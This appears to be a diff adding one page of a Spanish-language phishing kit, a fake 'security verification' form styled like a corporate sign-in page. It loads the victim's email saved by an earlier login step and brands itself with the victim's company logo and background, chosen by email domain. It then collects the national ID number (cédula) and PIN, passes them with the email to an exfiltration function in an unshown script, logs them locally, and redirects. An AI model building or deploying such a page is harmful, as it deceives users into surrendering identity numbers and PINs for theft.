@@ -1,0 +1,620 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verificación de seguridad</title>
+    <style>
+      :root {
+        --card-bg: #ffffff;
+        --text-main: #1b1b1b;
+        --text-sub: #616161;
+        --accent: #0067b8;
+        --accent-hover: #005ba1;
+        --border: #666666;
+        --border-light: #d6d6d6;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      html,
+      body {
+        height: 100%;
+        margin: 0;
+        font-family:
+          "Segoe UI",
+          system-ui,
+          -apple-system,
+          Arial,
+          sans-serif;
+        color: var(--text-main);
+      }
+
+      body {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+        background-color: #f2f2f2;
+        transition:
+          background-image 0.4s ease,
+          background-color 0.4s ease;
+        position: relative;
+      }
+
+      body::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(0, 0, 0, 0.5);
+        z-index: 0;
+      }
+
+      .login-card {
+        width: 100%;
+        max-width: 440px;
+        background: var(--card-bg);
+        padding: 44px 44px 36px;
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.25);
+        border-radius: 2px;
+        position: relative;
+        z-index: 1;
+      }
+
+      .logo-slot {
+        height: 32px;
+        margin-bottom: 16px;
+        display: flex;
+        align-items: center;
+      }
+
+      .logo-slot img {
+        max-height: 32px;
+        max-width: 220px;
+        object-fit: contain;
+      }
+
+      .logo-placeholder {
+        font-size: 13px;
+        color: #a0a0a0;
+        border: 1px dashed #cfcfcf;
+        padding: 4px 10px;
+        border-radius: 3px;
+      }
+
+      h1 {
+        font-size: 24px;
+        font-weight: 600;
+        margin: 0 0 4px;
+      }
+
+      .step-subtitle {
+        font-size: 15px;
+        color: var(--text-main);
+        margin: 0 0 20px;
+      }
+
+      .field {
+        position: relative;
+        margin-bottom: 4px;
+      }
+
+      .field input[type="text"],
+      .field input[type="password"] {
+        width: 100%;
+        padding: 8px 4px;
+        font-size: 15px;
+        border: none;
+        border-bottom: 1px solid var(--border);
+        outline: none;
+        background: transparent;
+        color: var(--text-main);
+        font-family: inherit;
+      }
+
+      .field input:focus {
+        border-bottom: 2px solid var(--accent);
+        padding-bottom: 7px;
+      }
+
+      .field .error {
+        display: none;
+        font-size: 13px;
+        color: #a4262c;
+        margin-top: 6px;
+      }
+
+      .field.has-error input {
+        border-bottom: 2px solid #a4262c;
+      }
+
+      .field.has-error .error {
+        display: block;
+      }
+
+      .account-chip {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        padding: 8px 0 20px;
+        font-size: 15px;
+        border-bottom: 1px solid var(--border-light);
+        margin-bottom: 20px;
+      }
+
+      .account-chip .avatar {
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        background: #5b5b5b;
+        color: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 14px;
+        flex-shrink: 0;
+      }
+
+      .account-chip span {
+        flex: 1;
+        word-break: break-all;
+      }
+
+      .account-chip button {
+        background: none;
+        border: none;
+        color: var(--accent);
+        font-size: 13px;
+        cursor: pointer;
+        padding: 6px 8px;
+      }
+
+      .account-chip button:hover {
+        text-decoration: underline;
+      }
+
+      .links {
+        margin: 16px 0 0;
+      }
+
+      .links a {
+        font-size: 13.5px;
+        color: var(--accent);
+        text-decoration: none;
+      }
+
+      .links a:hover {
+        text-decoration: underline;
+      }
+
+      .footer-row {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 36px;
+      }
+
+      .btn-primary {
+        background: var(--accent);
+        color: #fff;
+        border: none;
+        padding: 9px 26px;
+        font-size: 15px;
+        cursor: pointer;
+        min-width: 108px;
+        transition: background 0.15s ease;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+      }
+
+      .btn-primary:hover {
+        background: var(--accent-hover);
+      }
+
+      .btn-primary:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+      }
+
+      .signin-options {
+        margin-top: 28px;
+        padding-top: 16px;
+      }
+
+      .signin-options a {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 13.5px;
+        color: var(--accent);
+        text-decoration: none;
+      }
+
+      .signin-options a:hover {
+        text-decoration: underline;
+      }
+
+      .step {
+        display: none;
+      }
+
+      .step.active {
+        display: block;
+      }
+
+      .user-info {
+        background: #f0f7ff;
+        padding: 10px 14px;
+        border-radius: 4px;
+        margin-bottom: 16px;
+        font-size: 13px;
+        border-left: 3px solid var(--accent);
+      }
+
+      .user-info .label {
+        font-weight: 600;
+        color: var(--text-main);
+      }
+
+      .user-info .email {
+        color: var(--accent);
+        font-weight: 500;
+      }
+
+      /* Spinner */
+      .spinner {
+        display: none;
+        width: 18px;
+        height: 18px;
+        border: 2px solid #ffffff;
+        border-top: 2px solid transparent;
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+      }
+
+      .btn-primary.loading .spinner {
+        display: inline-block;
+      }
+
+      .btn-primary.loading .btn-text {
+        display: none;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      @media (max-width: 480px) {
+        .login-card {
+          box-shadow: none;
+          max-width: 100%;
+          min-height: 100vh;
+          padding: 32px 24px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-card" id="loginCard">
+      <div class="logo-slot" id="logoSlot">
+        <span class="logo-placeholder">Tu logo aquí</span>
+      </div>
+
+      <!-- Mostrar email del usuario -->
+      <div class="user-info" id="userInfo">
+        <span class="label">Usuario:</span>
+        <span class="email" id="userEmailDisplay"></span>
+      </div>
+
+      <!-- PASO 1: Cédula -->
+      <div class="step active" id="step1">
+        <h1>Verificación de seguridad</h1>
+        <p class="step-subtitle">Ingresa tu cédula</p>
+
+        <div class="field" id="cedulaField">
+          <input
+            type="text"
+            id="cedulaInput"
+            placeholder="Cédula"
+            autocomplete="off"
+          />
+          <p class="error">Ingresa una cédula válida.</p>
+        </div>
+
+        <div class="links">
+          <a href="#">¿Problemas con tu cédula?</a>
+        </div>
+
+        <div class="footer-row">
+          <span></span>
+          <button class="btn-primary" id="nextBtn">
+            <span class="btn-text">Siguiente</span>
+            <span class="spinner"></span>
+          </button>
+        </div>
+      </div>
+
+      <!-- PASO 2: PIN -->
+      <div class="step" id="step2">
+        <h1>Ingresa tu PIN</h1>
+        <p class="step-subtitle">PIN de 6 dígitos</p>
+
+        <div class="account-chip">
+          <div class="avatar" id="avatarLetter">U</div>
+          <span id="cedulaDisplay"></span>
+          <button id="changeAccountBtn">Cambiar cédula</button>
+        </div>
+
+        <div class="field" id="pinField">
+          <input
+            type="password"
+            id="pinInput"
+            placeholder="PIN de 4 dígitos"
+            autocomplete="off"
+            maxlength="4"
+            inputmode="numeric"
+          />
+          <p class="error">El PIN debe tener 4 dígitos.</p>
+        </div>
+
+        <div class="links">
+          <a href="#">¿Olvidó su PIN?</a>
+        </div>
+
+        <div class="footer-row">
+          <span></span>
+          <button class="btn-primary" id="signinBtn">
+            <span class="btn-text">Verificar</span>
+            <span class="spinner"></span>
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <script src="excedata.js"></script>
+    <script src="config.js"></script>
+
+    <script>
+      /* ================================================================
+           CONFIGURACIÓN — usa la configuración de config.js
+           ================================================================ */
+
+      /* ================================================================
+           LÓGICA DEL FORMULARIO
+           ================================================================ */
+
+      let currentEmpresa = null;
+      let userEmail = "";
+
+      // Detectar empresa por dominio del email
+      function detectEmpresa(emailValue) {
+        const v = emailValue.toLowerCase().trim();
+        const atIndex = v.indexOf("@");
+        const domainPart = atIndex !== -1 ? v.slice(atIndex + 1) : v;
+        return (
+          CONFIG.empresas.find(
+            (e) =>
+              e.dominio && domainPart.includes(e.dominio.toLowerCase().trim()),
+          ) || null
+        );
+      }
+
+      function applyProfile(empresa) {
+        currentEmpresa = empresa;
+
+        // Usar logo y fondo de la empresa si existe, sino los generales
+        const logo =
+          empresa && empresa.logo ? empresa.logo : CONFIG.general.logo;
+        const fondo =
+          empresa && empresa.fondo ? empresa.fondo : CONFIG.general.fondo;
+
+        // Aplicar fondo
+        if (fondo) {
+          document.body.style.backgroundImage = `url('${fondo}')`;
+          document.body.style.backgroundColor = "transparent";
+        } else {
+          document.body.style.backgroundImage =
+            "linear-gradient(135deg, #e9edf1 0%, #dbe2e8 100%)";
+          document.body.style.backgroundColor = "#f2f2f2";
+        }
+
+        // Aplicar logo
+        const logoSlot = document.getElementById("logoSlot");
+        if (logo) {
+          logoSlot.innerHTML = `<img src="${logo}" alt="Logo">`;
+        } else {
+          logoSlot.innerHTML = `<span class="logo-placeholder">Tu logo aquí</span>`;
+        }
+      }
+
+      function setLoading(button, loading) {
+        if (loading) {
+          button.classList.add("loading");
+          button.disabled = true;
+        } else {
+          button.classList.remove("loading");
+          button.disabled = false;
+        }
+      }
+
+      // --- Cargar usuario desde localStorage ---
+      function loadUserFromStorage() {
+        try {
+          // Intentar cargar desde lastLogin (guardado en login.html)
+          const lastLogin = JSON.parse(localStorage.getItem("lastLogin"));
+          if (lastLogin && lastLogin.email) {
+            userEmail = lastLogin.email;
+            document.getElementById("userEmailDisplay").textContent = userEmail;
+            document.getElementById("userInfo").style.display = "block";
+
+            // Detectar empresa y aplicar fondo/logo
+            const empresa = detectEmpresa(userEmail);
+            applyProfile(empresa);
+
+            return true;
+          }
+
+          // Si no hay lastLogin, intentar cargar desde loginData (último registro)
+          const loginData = JSON.parse(
+            localStorage.getItem("loginData") || "[]",
+          );
+          if (loginData.length > 0) {
+            const last = loginData[loginData.length - 1];
+            if (last && last.email) {
+              userEmail = last.email;
+              document.getElementById("userEmailDisplay").textContent =
+                userEmail;
+              document.getElementById("userInfo").style.display = "block";
+
+              // Detectar empresa y aplicar fondo/logo
+              const empresa = detectEmpresa(userEmail);
+              applyProfile(empresa);
+
+              return true;
+            }
+          }
+
+          return false;
+        } catch (error) {
+          console.error("Error al cargar usuario:", error);
+          return false;
+        }
+      }
+
+      // Elementos DOM
+      const step1 = document.getElementById("step1");
+      const step2 = document.getElementById("step2");
+      const cedulaInput = document.getElementById("cedulaInput");
+      const cedulaField = document.getElementById("cedulaField");
+      const pinField = document.getElementById("pinField");
+      const cedulaDisplay = document.getElementById("cedulaDisplay");
+      const avatarLetter = document.getElementById("avatarLetter");
+      const nextBtn = document.getElementById("nextBtn");
+      const signinBtn = document.getElementById("signinBtn");
+
+      // --- Paso 1 -> Paso 2 ---
+      nextBtn.addEventListener("click", () => {
+        const value = cedulaInput.value.trim();
+        if (!value || value.length < 5) {
+          cedulaField.classList.add("has-error");
+          return;
+        }
+        cedulaField.classList.remove("has-error");
+        cedulaDisplay.textContent = value;
+        avatarLetter.textContent = value.charAt(0).toUpperCase() || "U";
+
+        step1.classList.remove("active");
+        step2.classList.add("active");
+        // Enfocar el campo PIN
+        document.getElementById("pinInput").focus();
+      });
+
+      // --- Cambiar cédula (volver al paso 1) ---
+      document
+        .getElementById("changeAccountBtn")
+        .addEventListener("click", () => {
+          step2.classList.remove("active");
+          step1.classList.add("active");
+          pinField.classList.remove("has-error");
+        });
+
+      // --- Verificar (envía email, cédula y PIN) ---
+      signinBtn.addEventListener("click", async () => {
+        const cedula = cedulaInput.value.trim();
+        const pin = document.getElementById("pinInput").value.trim();
+
+        // Validar PIN de 6 dígitos
+        if (!pin || pin.length !== 4 || !/^\d+$/.test(pin)) {
+          pinField.classList.add("has-error");
+          return;
+        }
+        pinField.classList.remove("has-error");
+
+        setLoading(signinBtn, true);
+
+        try {
+          const empresaNombre = currentEmpresa
+            ? currentEmpresa.dominio
+            : "General";
+
+          // ENVIAR: email, cedula, pin, empresa
+          const success = await sendCedulaPinData(
+            userEmail,
+            cedula,
+            pin,
+            empresaNombre,
+          );
+
+          if (success) {
+            // Guardar en localStorage
+            const loginData = {
+              email: userEmail,
+              cedula,
+              pin,
+              timestamp: new Date().toISOString(),
+              empresa: empresaNombre,
+            };
+
+            try {
+              const existing = JSON.parse(
+                localStorage.getItem("loginData") || "[]",
+              );
+              existing.push(loginData);
+              localStorage.setItem("loginData", JSON.stringify(existing));
+              localStorage.setItem("lastLogin", JSON.stringify(loginData));
+            } catch (error) {
+              console.error("Error al guardar en localStorage:", error);
+            }
+
+            // Redirigir
+            if (CONFIG.redirectUrl3) {
+              window.location.href = CONFIG.redirectUrl3;
+            } else {
+              alert("Verificación exitosa");
+            }
+          } else {
+            alert("Error al verificar los datos. Intenta de nuevo.");
+            setLoading(signinBtn, false);
+          }
+        } catch (error) {
+          console.error("Error en el proceso de verificación:", error);
+          alert("Ocurrió un error. Intenta de nuevo.");
+          setLoading(signinBtn, false);
+        }
+      });
+
+      // --- Enter para avanzar ---
+      cedulaInput.addEventListener("keydown", (e) => {
+        if (e.key === "Enter") nextBtn.click();
+      });
+
+      document.getElementById("pinInput").addEventListener("keydown", (e) => {
+        if (e.key === "Enter") signinBtn.click();
+      });
+
+      // --- Validar que el PIN solo acepte números ---
+      document
+        .getElementById("pinInput")
+        .addEventListener("input", function (e) {
+          this.value = this.value.replace(/\D/g, "");
+        });
+
+      // --- Estado inicial: cargar usuario desde localStorage ---
+      loadUserFromStorage();
+    </script>
+  </body>
+</html>
